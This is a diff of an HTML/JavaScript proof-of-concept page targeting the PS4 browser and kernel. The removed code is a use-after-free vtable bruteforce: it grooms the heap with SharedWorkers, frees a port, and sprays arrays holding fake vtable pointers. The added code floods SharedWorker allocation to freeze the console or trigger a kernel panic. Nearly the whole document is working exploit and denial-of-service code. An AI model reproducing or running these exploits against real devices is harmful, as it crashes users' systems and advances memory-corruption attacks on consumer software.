@@ -1,114 +1,81 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 VTABLE BRUTEFORCE</title>
-    
+    <title>PS4 Kernel Resource Exhaustion PoC</title>
 </head>
 <body>
 
-    <h1>VTABLE BRUTEFORCE (Top 3 Candidates)</h1>
-    <div id="controls"></div>
-    <div id="log">Pronto.</div>
+    <h1>SharedWorker Kernel Panic PoC</h1>
+    
+    <p>Target limit > 400 Safe.</p>
+    <p>Target limit > 401-405 triggers Freeze.</p>
+    <p>Target limit > 405+ Starts Kernel Panic.</p>
+
+    <label>
+        Workers Target: <input type="number" id="count" value="600">
+    </label>
+    <button onclick="run()">TRIGGER PANIC</button>
+
+    <div id="log">Ready.<br></div>
 
     <script>
-        function log(msg, cls="") {
-            var d = document.getElementById("log");
-            d.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            d.scrollTop = d.scrollHeight;
+        // Array to keep workers alive (prevent GC and force Kernel allocation)
+        let keeps = [];
+
+        function log(msg) {
+            const el = document.getElementById('log');
+            el.innerHTML = `> ${msg}<br>` + el.innerHTML;
         }
 
-        // CANDIDATOS EXTRAÍDOS
-        const CANDIDATES = [
-            0x2BB15A8n, 
-            0x2BB2208n, 
-            0x2E01C60n
-        ];
+        function run() {
+            const limit = parseInt(document.getElementById('count').value);
+            log(`Allocating ${limit} SharedWorkers...`);
+            log("System instability expected around 400.");
+            log("Kernel Panic expected above 405.");
 
-        // Base Golden (A que deu Freeze antes)
-        const BASE = 0x820000000n;
+            if (!window.SharedWorker) return log("SharedWorker API not supported.");
 
-        // Tamanho Confirmado (0xC0 deu panic)
-        const SIZE = 0xC0; 
-
-        function build_payload(vtable_offset) {
-            // Double Array Spray (Butterfly Heap)
-            // 192 bytes total. 
-            // Header Array = 16 bytes. 
-            // Payload = 176 bytes / 8 = 22 elementos.
-            var arr = new Array(22);
+            let created = 0;
             
-            // Endereço Real da VTable
-            var vtable = BASE + vtable_offset;
-            
-            // Converte para Float
-            var buf = new ArrayBuffer(8);
-            var view = new DataView(buf);
-            view.setBigUint64(0, vtable, true);
-            var vtable_float = view.getFloat64(0, true);
+            // Fast interval to flood the kernel allocator
+            const interval = setInterval(() => {
+                // Batch creation to speed up the process
+                for (let i = 0; i < 5; i++) {
+                    try {
+                        // Using a unique name (timestamp + counter) forces the Kernel 
+                        // to create a new IPC handle/process structure for each worker.
+                        const id = "kpanic_" + Date.now() + "_" + created;
+                        
+                        // Create and hold reference
+                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", id);
+                        sw.port.start(); // Ensure port is active and handle is allocated
+                        keeps.push(sw);
+                        
+                        created++;
 
-            // Enche o objeto
-            for(var i=0; i<arr.length; i++) arr[i] = vtable_float;
-            return arr;
-        }
-
-        var workers_stash = [];
-
-        async function run_test(idx) {
-            var offset = CANDIDATES[idx];
-            log(`>>> TESTANDO: 0x${offset.toString(16)} <<<`);
-            
-            var payload = build_payload(offset);
-
-            // Grooming
-            for(let i=0; i<380; i++) {
-                try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
-            }
-
-            // Trigger
-            var count = 0;
-            var it = setInterval(() => {
-                if(count >= 23) { // 403
-                    clearInterval(it);
-                    
-                    var v = workers_stash.pop();
-                    var p = v.port;
-                    v.port.close();
-                    
-                    var spray = [];
-                    for(var k=0; k<30000; k++) spray.push(payload.slice(0));
-                    
-                    setTimeout(() => {
-                        try {
-                            var s = p.toString();
-                            // Se não crashar e não for MessagePort -> Sucesso
-                            if (s.indexOf("MessagePort") === -1) {
-                                log("!!! SUCESSO !!!", "success");
-                                alert("VTable Correta: 0x" + offset.toString(16));
-                            } else {
-                                log("Falha: Objeto intacto.");
-                            }
-                        } catch(e) {
-                            log("Erro: " + e);
+                        if (created >= limit) {
+                            clearInterval(interval);
+                            log(`Limit reached (${limit}). Waiting for system crash...`);
+                            return;
                         }
-                        workers_stash.forEach(w=>{try{w.port.close()}catch(e){}});
-                        workers_stash = [];
-                    }, 500);
-                    return;
-                }
-                try { workers_stash.push(new SharedWorker("data:text,1", "v"+count)); } catch(e){}
-                count++;
-            }, 50);
-        }
 
-        // UI
-        var div = document.getElementById("controls");
-        CANDIDATES.forEach((c, i) => {
-            var b = document.createElement("button");
-            b.innerText = `Testar 0x${c.toString(16)}`;
-            b.onclick = () => run_test(i);
-            div.appendChild(b);
-        });
+                    } catch (e) {
+                        // If the browser catches the error, log it.
+                        // However, the Kernel usually panics before this catch block triggers.
+                        clearInterval(interval);
+                        log(`Alloc Error at ${created}: ${e.message}`);
+                        return;
+                    }
+                }
+                
+                // Update log every 50 creations to avoid UI lag interfering with the test
+                if (created % 50 === 0) log(`Active: ${created}...`);
+
+            }, 5);
+        }
     </script>
 </body>
 </html>
+
+
